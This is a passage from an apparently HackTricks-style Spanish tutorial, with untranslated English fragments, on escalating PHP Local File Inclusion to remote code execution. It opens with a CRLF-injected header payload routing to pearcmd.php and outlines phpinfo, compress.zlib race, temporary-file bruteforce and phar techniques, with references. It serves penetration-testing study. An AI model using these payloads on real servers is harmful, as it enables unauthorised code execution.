Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### A través de phpinfo() (file_uploads = on)

Si encontraste una **Local File Inclusion** y un archivo que expone **phpinfo()** con file_uploads = on puedes obtener RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### A través de compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Si encontraste una **Local File Inclusion** y **can exfiltrate the path** del archivo temporal PERO el **server** está **checking** si el **file to be included has PHP marks**, puedes intentar **bypass that check** con esta **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### A través de eternal waiting + bruteforce

Si puedes abusar del LFI para **upload temporary files** y hacer que el server **hang** la ejecución de PHP, entonces podrías **brute force filenames during hours** para encontrar el archivo temporal:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### A Fatal Error

Si incluyes cualquiera de los archivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Necesitas incluir el mismo 2 veces para provocar ese error).

**No sé cómo puede ser útil esto pero podría serlo.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
